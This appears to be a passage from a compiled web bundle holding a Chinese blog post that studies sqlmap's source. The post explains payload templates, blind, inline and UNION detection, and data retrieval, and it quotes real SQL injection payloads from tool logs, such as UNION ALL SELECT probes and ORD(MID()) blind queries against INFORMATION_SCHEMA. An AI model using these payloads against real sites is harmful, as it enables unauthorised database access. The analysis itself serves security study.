    &lt;risk&gt;1&lt;/risk&gt;
    &lt;clause&gt;1,8,9&lt;/clause&gt;
    &lt;where&gt;1&lt;/where&gt;
    &lt;vector&gt;AND [INFERENCE]&lt;/vector&gt;
    &lt;request&gt;
        &lt;payload&gt;AND [RANDNUM]=[RANDNUM]&lt;/payload&gt;
    &lt;/request&gt;
    &lt;response&gt;
        &lt;comparison&gt;AND [RANDNUM]=[RANDNUM1]&lt;/comparison&gt;
    &lt;/response&gt;
&lt;/test&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,4),Nn=n("code",null,"request.payload",-1),Sn=n("code",null,"request.comparison",-1),Tn={href:"https://notes.surfrid3r.top/2023/02/12/sqlmap%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/#comparison",target:"_blank",rel:"noopener noreferrer"},xn=n("h5",{id:"页面相似度判断",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#页面相似度判断","aria-hidden":"true"},"#"),s(" 页面相似度判断")],-1),Dn={href:"https://notes.surfrid3r.top/2023/02/20/sqlmap%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%9B%B8%E4%BC%BC%E5%BA%A6%E5%88%A4%E6%96%AD/",target:"_blank",rel:"noopener noreferrer"},Bn=t(`<ul><li><p>检测网站动态型，尝试去除掉动态元素</p></li><li><p>即去除掉 HTML 中的 script, style 和 comment 等标签内容，提取纯文本标签中的内容。</p></li><li><p>对于高动态页面会调用更精准的相似度计算函数</p></li><li><p>sqlmap 会不断根据历史请求调整相似度的阈值。</p></li></ul><h4 id="报错注入和内联注入" tabindex="-1"><a class="header-anchor" href="#报错注入和内联注入" aria-hidden="true">#</a> 报错注入和内联注入</h4><p>报错注入和内联注入的检测逻辑比较检测，以其中一个为例：</p><div class="language-XML line-numbers-mode" data-ext="XML"><pre class="language-XML"><code>&lt;test&gt;
    &lt;title&gt;Generic inline queries&lt;/title&gt;
    &lt;stype&gt;3&lt;/stype&gt;
    &lt;level&gt;1&lt;/level&gt;
    &lt;risk&gt;1&lt;/risk&gt;
    &lt;clause&gt;1,2,3,8&lt;/clause&gt;
    &lt;where&gt;3&lt;/where&gt;
    &lt;vector&gt;(SELECT CONCAT(CONCAT(&#39;[DELIMITER_START]&#39;,([QUERY])),&#39;[DELIMITER_STOP]&#39;))&lt;/vector&gt;
    &lt;request&gt;
        &lt;payload&gt;(SELECT CONCAT(CONCAT(&#39;[DELIMITER_START]&#39;,(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN &#39;1&#39; ELSE &#39;0&#39; END)),&#39;[DELIMITER_STOP]&#39;))&lt;/payload&gt;
    &lt;/request&gt;
    &lt;response&gt;
        &lt;grep&gt;[DELIMITER_START](?P&amp;lt;result&amp;gt;.*?)[DELIMITER_STOP]&lt;/grep&gt;
    &lt;/response&gt;
&lt;/test&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,4),Cn=n("code",null,"request.payload",-1),In=n("code",null,"response.grep",-1),Mn=n("code",null,"DELIMITER_START",-1),Rn=n("code",null,"[DELIMITER_STOP]",-1),On=n("code",null,"response.grep",-1),Un={href:"https://notes.surfrid3r.top/2023/02/12/sqlmap%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/#grep",target:"_blank",rel:"noopener noreferrer"},Pn=n("h4",{id:"union注入",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#union注入","aria-hidden":"true"},"#"),s(" Union注入")],-1),Fn=n("code",null,"union_query.xml",-1),wn=n("code",null,"columns",-1),Yn=n("code",null,"char",-1),Hn={href:"https://notes.surfrid3r.top/2023/02/12/sqlmap%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/#union",target:"_blank",rel:"noopener noreferrer"},Vn=t(`<div class="language-XML line-numbers-mode" data-ext="XML"><pre class="language-XML"><code>&lt;test&gt;
    &lt;title&gt;Generic UNION query ([CHAR]) - [COLSTART] to [COLSTOP] columns (custom)&lt;/title&gt;
    &lt;stype&gt;6&lt;/stype&gt;
    &lt;level&gt;1&lt;/level&gt;
    &lt;risk&gt;1&lt;/risk&gt;
    &lt;clause&gt;1,2,3,4,5&lt;/clause&gt;
    &lt;where&gt;1&lt;/where&gt;
    &lt;vector&gt;[UNION]&lt;/vector&gt;
    &lt;request&gt;
        &lt;payload/&gt;
        &lt;comment&gt;[GENERIC_SQL_COMMENT]&lt;/comment&gt;
        &lt;char&gt;[CHAR]&lt;/char&gt;
        &lt;columns&gt;[COLSTART]-[COLSTOP]&lt;/columns&gt;
    &lt;/request&gt;
    &lt;response&gt;
        &lt;union/&gt;
    &lt;/response&gt;
&lt;/test&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol><li><p>首先需要确认是否可能存在sql注入，sqlmap首先对比 <code>order by 1</code> 和 <code>order by randomInt()</code> 的响应包页面内容,如果不同就可能存在注入点。</p></li><li><p>然后就是要确定列数，<code>[COLSTART]</code>和<code>[COLSTOP]</code>标明了 Union注入要推测的列数范围，之后 sqlmap 会通过 <code>order by</code> 或者 <code>union all</code>的方式去在该范围内暴力破解列数（二分法测试，当第 n+1 列与原始页面不同，且第 n 例与原始页面相同时就得到了实际的列数）。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">[</span><span class="token number">21</span>:48:54<span class="token punctuation">]</span> <span class="token punctuation">[</span>PAYLOAD<span class="token punctuation">]</span> <span class="token number">1</span><span class="token punctuation">)</span> ORDER BY <span class="token number">1</span>-- -
<span class="token punctuation">[</span><span class="token number">21</span>:48:59<span class="token punctuation">]</span> <span class="token punctuation">[</span>PAYLOAD<span class="token punctuation">]</span> <span class="token number">1</span><span class="token punctuation">)</span> ORDER BY <span class="token number">2137</span>-- -
<span class="token punctuation">[</span><span class="token number">22</span>:05:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>PAYLOAD<span class="token punctuation">]</span> <span class="token number">1</span><span class="token punctuation">)</span> UNION ALL SELECT NULL-- -
<span class="token punctuation">[</span><span class="token number">22</span>:05:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>PAYLOAD<span class="token punctuation">]</span> <span class="token number">1</span><span class="token punctuation">)</span> UNION ALL SELECT NULL,NULL-- -
<span class="token punctuation">[</span><span class="token number">22</span>:05:29<span class="token punctuation">]</span> <span class="token punctuation">[</span>PAYLOAD<span class="token punctuation">]</span> <span class="token number">1</span><span class="token punctuation">)</span> UNION ALL SELECT NULL,NULL,NULL-- -
<span class="token punctuation">[</span><span class="token number">22</span>:05:29<span class="token punctuation">]</span> <span class="token punctuation">[</span>PAYLOAD<span class="token punctuation">]</span> <span class="token number">1</span><span class="token punctuation">)</span> UNION ALL SELECT NULL,NULL,NULL,NULL-- -
<span class="token punctuation">[</span><span class="token number">22</span>:05:29<span class="token punctuation">]</span> <span class="token punctuation">[</span>PAYLOAD<span class="token punctuation">]</span> <span class="token number">1</span><span class="token punctuation">)</span> UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>得到列数后，sqlmap还需要推测可注入点在这些列数中的具体位置（position）,只在对应的列中使用随机数，然后再去匹配响应包内容，如果命中对应的position即使对应的位置。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">[</span><span class="token number">22</span>:31:42<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> target URL appears to have <span class="token number">3</span> columns <span class="token keyword">in</span> query
<span class="token punctuation">..</span>.
<span class="token punctuation">[</span><span class="token number">22</span>:36:10<span class="token punctuation">]</span> <span class="token punctuation">[</span>PAYLOAD<span class="token punctuation">]</span> <span class="token number">1</span><span class="token string">&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x7178717871,0x4b65654d4a6152447a7a,0x7171707671)-- -
[22:36:36] [PAYLOAD] 1&#39;</span> UNION ALL SELECT CONCAT<span class="token punctuation">(</span>0x7178717871,0x4e7051484f6150596851,0x7171707671<span class="token punctuation">)</span>,NULL,NULL-- -
<span class="token punctuation">[</span><span class="token number">22</span>:36:42<span class="token punctuation">]</span> <span class="token punctuation">[</span>PAYLOAD<span class="token punctuation">]</span> <span class="token number">1</span><span class="token string">&#39; UNION ALL SELECT NULL,CONCAT(0x7178717871,0x676c7a4b77594a49576c,0x7171707671),NULL-- -
[22:37:37] [PAYLOAD] -4730&#39;</span> UNION ALL SELECT NULL,CONCAT<span class="token punctuation">(</span>0x7178717871,0x416b4f584b686f417050724b4651624564585770574868515a506c6e58454d485a58645a66546b57,0x7171707671<span class="token punctuation">)</span>,NULL-- -
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ol><h3 id="sqlmap的攻击成功数据获取-getvalue" tabindex="-1"><a class="header-anchor" href="#sqlmap的攻击成功数据获取-getvalue" aria-hidden="true">#</a> sqlmap的攻击成功数据获取（getValue）</h3><p>在获取注入点和注入模板之后，接下来的步骤是利用这些信息去获取数据。为了方便不同类型的SQL注入通过相应的模板获取数据，sqlmap将其统一封装到了<code>getValue</code>函数中。只需提供SQL语句，该函数就能返回结果，接下来分析下sqlmap是如何做到的。（注入模板对应的是 <code>payloads/*.xml</code> 中 <code>vector</code> 标签内的内容。一般都会存在一些特殊标签（例如 <code>[QUERY]</code>, <code>[INFERENCE]</code>），用于替换<code>queries.xml</code>中具体的语句。）</p><p>sqlmap 将不同类型sql注入分为两类，根据不同的类型调用的方式也不同：</p><ol><li>回显类型（报错注入，内联注入和union注入），直接提取响应页面中内容即可。</li><li>盲注类型（时间盲注和布尔盲注），该类型根据页面的返回结果只能得到 <code>True/False</code> 两种结果，因此如果需要获取内容需要通过<code>ord</code>等函数进行大量的数据包推测。</li></ol><h4 id="回显类型" tabindex="-1"><a class="header-anchor" href="#回显类型" aria-hidden="true">#</a> 回显类型</h4><p>直接替换模板中的<code>[QUERY]</code>标签即可，匹配时通过分割符<code>DELIMITER_START</code>,<code>[DELIMITER_STOP]</code>即可进行定位。</p><h4 id="盲注类型" tabindex="-1"><a class="header-anchor" href="#盲注类型" aria-hidden="true">#</a> 盲注类型</h4><p>该类型获取内容的方式分为两种：</p>`,10),Qn=n("code",null,"True/False",-1),Wn={href:"https://notes.surfrid3r.top/2023/02/12/sqlmap%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/#go-boolean-proxy",target:"_blank",rel:"noopener noreferrer"},Xn=n("code",null,"[INFERENCE]",-1),Gn=t(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># 获取vector模板</span>
vector <span class="token operator">=</span> getTechniqueData<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>vector
<span class="token comment"># 手动把[INFRENECE]替换，不使用XML中的[INFERENCE]语句</span>
vector <span class="token operator">=</span> vector<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>INFERENCE_MARKER<span class="token punctuation">,</span> expression<span class="token punctuation">)</span>
query <span class="token operator">=</span> agent<span class="token punctuation">.</span>prefixQuery<span class="token punctuation">(</span>vector<span class="token punctuation">)</span>
query <span class="token operator">=</span> agent<span class="token punctuation">.</span>suffixQuery<span class="token punctuation">(</span>query<span class="token punctuation">)</span>
<span class="token comment"># 生成payload</span>
payload <span class="token operator">=</span> agent<span class="token punctuation">.</span>payload<span class="token punctuation">(</span>newValue<span class="token operator">=</span>query<span class="token punctuation">)</span>
<span class="token comment"># 是否时间盲注</span>
timeBasedCompare <span class="token operator">=</span> getTechnique<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>PAYLOAD<span class="token punctuation">.</span>TECHNIQUE<span class="token punctuation">.</span>TIME<span class="token punctuation">,</span> PAYLOAD<span class="token punctuation">.</span>TECHNIQUE<span class="token punctuation">.</span>STACKED<span class="token punctuation">)</span>
<span class="token comment"># 想target发送请求，判断相似度或者时间</span>
<span class="token keyword">if</span> output <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
	output <span class="token operator">=</span> Request<span class="token punctuation">.</span>queryPage<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> timeBasedCompare<span class="token operator">=</span>timeBasedCompare<span class="token punctuation">,</span> raise404<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),jn={href:"https://notes.surfrid3r.top/2023/02/12/sqlmap%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/#go-inference-proxy",target:"_blank",rel:"noopener noreferrer"},Kn=n("code",null,"[INFERENCE]",-1),zn=n("code",null,"queries.xml",-1),Jn=n("code",null,"INFRENCE",-1),Zn=t(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># prefixQuery中替换[INFERENCE]的是xml字段中的inference标签</span>
<span class="token comment"># ORD(MID((%s),%d,1))&gt;%d</span>
query <span class="token operator">=</span> agent<span class="token punctuation">.</span>prefixQuery<span class="token punctuation">(</span>getTechniqueData<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>vector<span class="token punctuation">)</span>
query <span class="token operator">=</span> agent<span class="token punctuation">.</span>suffixQuery<span class="token punctuation">(</span>query<span class="token punctuation">)</span>
payload <span class="token operator">=</span> agent<span class="token punctuation">.</span>payload<span class="token punctuation">(</span>newValue<span class="token operator">=</span>query<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>以 mysql 为例，简述步骤：</p><ol><li>盲注需要获取的 payload 为 <code>SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR)</code></li><li>inference 标签对于的模板为 <code>ORD(MID((%s),%d,1))&gt;%d</code>：</li></ol><ul><li><code>%s</code> 替换为 payload</li><li>剩余的两个 <code>%d</code> 为测试字符的 index 和推测的字符</li></ul><ol start="3"><li><p>最后逐个测试的过程如下：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">[</span><span class="token number">20</span>:18:46<span class="token punctuation">]</span> <span class="token punctuation">[</span>PAYLOAD<span class="token punctuation">]</span> <span class="token number">1</span><span class="token string">&#39; AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),1,1))&gt;64 AND &#39;</span>ckmO<span class="token string">&#39;=&#39;</span>ckmO
<span class="token punctuation">[</span><span class="token number">20</span>:18:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>PAYLOAD<span class="token punctuation">]</span> <span class="token number">1</span><span class="token string">&#39; AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),1,1))&gt;96 AND &#39;</span>ckmO<span class="token string">&#39;=&#39;</span>ckmO
<span class="token punctuation">[</span><span class="token number">20</span>:18:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>PAYLOAD<span class="token punctuation">]</span> <span class="token number">1</span><span class="token string">&#39; AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),1,1))&gt;112 AND &#39;</span>ckmO<span class="token string">&#39;=&#39;</span>ckmO
<span class="token punctuation">[</span><span class="token number">20</span>:18:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>PAYLOAD<span class="token punctuation">]</span> <span class="token number">1</span><span class="token string">&#39; AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),1,1))&gt;104 AND &#39;</span>ckmO<span class="token string">&#39;=&#39;</span>ckmO
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ol>`,5),$n=t('<h3 id="sqlmap的注入后利用" tabindex="-1"><a class="header-anchor" href="#sqlmap的注入后利用" aria-hidden="true">#</a> sqlmap的注入后利用</h3><p>sqlmap 的注入后利用主要分为4类：</p><ul><li>数据库基础信息获取-Enumeration</li><li>数据库用户信息获取-Users</li><li>数据库内容获取-Database</li><li>接管操作系统-takeover</li></ul><p>主要的语句的都位于<code>queries.xml</code>的各个标签中，之前利用的时候可以进行参考。</p><h3 id="其他" tabindex="-1"><a class="header-anchor" href="#其他" aria-hidden="true">#</a> 其他</h3><p>待补充</p><h2 id="参考链接" tabindex="-1"><a class="header-anchor" href="#参考链接" aria-hidden="true">#</a> 参考链接</h2>',7),ns={href:"https://github.com/sqlmapproject/sqlmap/wiki/Usage",target:"_blank",rel:"noopener noreferrer"},ss={href:"https://sqlmap.highlight.ink/",target:"_blank",rel:"noopener noreferrer"},as={href:"https://www.anquanke.com/post/id/262848",target:"_blank",rel:"noopener noreferrer"},es={href:"https://zhuanlan.zhihu.com/p/43242220",target:"_blank",rel:"noopener noreferrer"};function ts(ls,os){const a=i("ExternalLinkIcon");return o(),p("div",null,[d,n("p",null,[s("​ 笔者对于 sqlmap 的部分源码详细分析笔记存放于"),n("a",k,[s("sqlmap源码分析"),e(a)]),s("此处，该文章的主要目的是归纳，总结，只会列举一些笔者觉得可以借鉴的点。")]),m,n("p",null,[s("在分析sqlmap时会发现存在几个函数非常重要，在sqlmap的各个阶段都能够看见存在调用，详见"),n("a",v,[s("sqlmap核心函数分析"),e(a)]),s("：")]),h,n("p",null,[s("sqlmap 关于操作系统和服务器指纹的识别在"),n("a",g,[s("conet.queryPage"),e(a)]),s("函数中。sqlmap 在收发数据包时会进行响应内容的指纹识别，并且识别出的目标指纹信息更新到"),b,s("全局变量中。")]),E,n("p",null,[s("为了能够再后利用中更加精准的查询，sqlmap 在除了识别 DMBS 的类型后，还会尽可能的去识别 DBMS 的具体版本类型（因为版本差距较大的数据库往往可能函数甚至是库都是不同的）。以 "),_,s(" 为例，sqlmap 是测试不同 "),q,s(" 版本的特性语句或者数据库是否存在来推测数据库的大致版本范围（详见 "),n("a",A,[s("checkDbms函数"),e(a)]),s("）")]),y,n("ol",null,[n("li",null,[n("p",null,[s("sqlmap 本身是存在 WAF 检测函数即 check_waf()，该函数的功能非常弱，只能够检测是否存在 WAF，不具备 WAF 类型指纹的识别，其主要原理是通过发送一段明显恶意的 payload，然后判断响应包内容和正常请求的响应页面的相似度是否小于"),L,s("，若满足 sqlmap 会认为存在 WAF，之后便会推荐你使用 tamper 脚本进行绕过。（详见"),n("a",f,[s("checkWaf分析"),e(a)]),s("）")]),N]),n("li",null,[n("p",null,[s("sqlmap 能够识别 WAF 指纹的功能其实属于第三方插件，主要功能代码位于 "),S,s(" 下，其来源是该 Github 上的仓库: "),n("a",T,[s("https://github.com/stamparm/identYwaf。sqlmap"),e(a)]),s(" 默认会在前10个响应数据包中，去匹配"),x,s("中各类 WAF 的 regex正则规则，如果命中则判断存在对于类型 WAF。")]),D]),n("li",null,[n("p",null,[s("此外，还存在"),B,s("字段，sqlmap并没有使用该字段。该字段相关资料可以参考："),n("a",C,[s("https://www.slideshare.net/stamparm/blind-waf-identification。顺便分析了一下`identYwaf`对该字段的使用。（详见"),e(a)]),n("a",I,[s("identYwaf signature分析"),e(a)]),s("）")]),M])]),R,n("p",null,[O,s(" 函数是 sqlmap 中重要的请求函数，所有的发送请求函数都是调用该接口。在 sqlmap 源码中看到有大量的使用，因此该函数的分析是非常重要（详见"),n("a",U,[s("Request.queryPage"),e(a)]),s("），此处仅作标记。")]),P,F,n("ul",null,[n("li",null,[s("sqlmap会对网站的动态性进行检测，目的是为了提高页面相似度判断的准确率，详见"),n("a",w,[s("checkStability"),e(a)])]),n("li",null,[s("sqlmap会对网站中的动态元素（广告等）进行检测，并且在相似度比较时会去除掉这些动态元素（removeDynamicContent），详见"),n("a",Y,[s("findDynamicContent"),e(a)])]),n("li",null,[s("sqlmap会对url参数进行检测，如果时静态参数就不会对该参数进行sql注入测试，详见"),n("a",H,[s("checkDynParam"),e(a)])]),n("li",null,[s("如果开启"),V,s("用于加速检测，sqlmap 还会进行 "),n("a",Q,[s("checkNullConnection"),e(a)]),s(".checkNullConnection是一种能大量节省带宽的测试方法，不接收响应Body，只通过HTTP Header中返回的"),W,s("或者"),X,s("字段来获取响应Body长度，从而判断是否输入成功。（能够支持的该类检测的只有布尔盲注）")])]),G,j,K,n("ul",null,[n("li",null,[s("通过"),z,s(" 和 "),J,s(" 命令行参数控制，不同"),Z,s("和"),$,s("等级的 payload 的检测位置和需要测试的请求包都是不一样的（详见"),n("a",nn,[s("sqlmap的level和risk等级定义"),e(a)]),s("）")]),sn,an]),en,n("p",null,[s("sqlmap 的 payload 由两部分组成： "),tn,s("中的界定符 和 "),ln,s("中的各类sql注入的 payload模板（详见"),n("a",on,[s("sqlmap的xml文件"),e(a)]),s("）。这些都位于XML文件中。")]),pn,cn,n("ol",un,[n("li",null,[s("xml 文件中还包含了对应payload是否攻击成功的判定（详见"),n("a",rn,[s("sqlmap的xml文件"),e(a)]),s("）")])]),dn,kn,mn,n("ol",null,[n("li",null,[vn,n("ul",null,[n("li",null,[n("p",null,[s("base64编码、特殊字符的替换和编码详见："),n("a",hn,[s("ajustLateValues函数"),e(a)])])]),gn])]),n("li",null,[n("p",null,[s("另外 sqlmap 还支持 tamper 脚本，对 payload 进行二次处理从而尝试进行针对性绕过,详见"),n("a",bn,[s("payload函数"),e(a)])])])]),En,n("p",null,[s("可以看到发送的 payload 位于 "),_n,s(" 中，而检测逻辑则位于 "),qn,s("中。该 payload 如果攻击成功（还要加上"),An,s("中的分隔符），则会产生"),yn,s("秒时延，如果满足条件则认为 对应的 payload + 对应的 boundary 组合的payload模板即为注入点。具体的检测逻辑详见"),n("a",Ln,[s("sqlmap_time"),e(a)]),s("。")]),fn,n("p",null,[s("可以看到"),Nn,s("和"),Sn,s("会生成两种payload，并且逻辑上是相反。sqlmap 正是会判断这两种页面的相似度来判断是否攻击成功，详见"),n("a",Tn,[s("sqlmap_comparison"),e(a)]),s("。")]),xn,n("p",null,[s("另外值得一说的就是sqlmap对应页面相似的判断逻辑，详见"),n("a",Dn,[s("sqlmap 的页面相似度判断"),e(a)]),s("。在判断页面相似度前，sqlmap 会响应页面内容进行了大量的排除无意义内容来提高正确率：")]),Bn,n("p",null,[Cn,s("和"),In,s("中包含两个特殊字符"),Mn,s("和"),Rn,s("，这些特殊字符被用作分割符。在发送payload之前，sqlmap会替换这些特殊字符为随机字符。如果注入成功，响应包中会存在与分割符包裹的查询结果，因此可以使用"),On,s("生成的正则表达式进行匹配，具体的检测逻辑详见"),n("a",Un,[s("sqlmap_grep"),e(a)]),s("。")]),Pn,n("p",null,[s("union注入的攻击成功判别比较复杂，sqlmap 在这个过程中不仅会判断是否可能存在Union注入，还存进行推测注入点所在的具体位置，因此会消耗大量的数据包进行推测。以其中一个为例(需要说明的是"),Fn,s("中的 payload 模板都非常相似，一般只有"),wn,s("和"),Yn,s("两个标签的区别，即不同的推测列数范围和使用字符。)，详见"),n("a",Hn,[s("sqlmap_union"),e(a)]),s("。")]),Vn,n("ol",null,[n("li",null,[n("p",null,[s("只需要获取"),Qn,s("结果即可（"),n("a",Wn,[s("_goBooleanProxy函数"),e(a)]),s("），这种也非常方便。替换掉"),Xn,s("标签为查询语句即可，时间盲注则判断响应时间；布尔盲注则判断页面相似度。")]),Gn]),n("li",null,[n("p",null,[s("如果要获取内容("),n("a",jn,[s("_goInferenceProxy函数"),e(a)]),s("),则比较麻烦。需要替换掉"),Kn,s("标签为"),zn,s("中"),Jn,s("对应的语句，并且不断的通过二分法进行缩小范围测试.")]),Zn])]),$n,n("ul",null,[n("li",null,[n("a",ns,[s("sqlmap Usage"),e(a)])]),n("li",null,[n("a",ss,[s("sqlmap 用户手册中文版"),e(a)])]),n("li",null,[n("a",as,[s("sqlmap 项目剖析_tlmn"),e(a)])]),n("li",null,[n("a",es,[s("sqlmap 内核分析_v1ll4n"),e(a)])])])])}const is=l(r,[["render",ts],["__file","sqlmap源码学习.html.vue"]]);export{is as default};
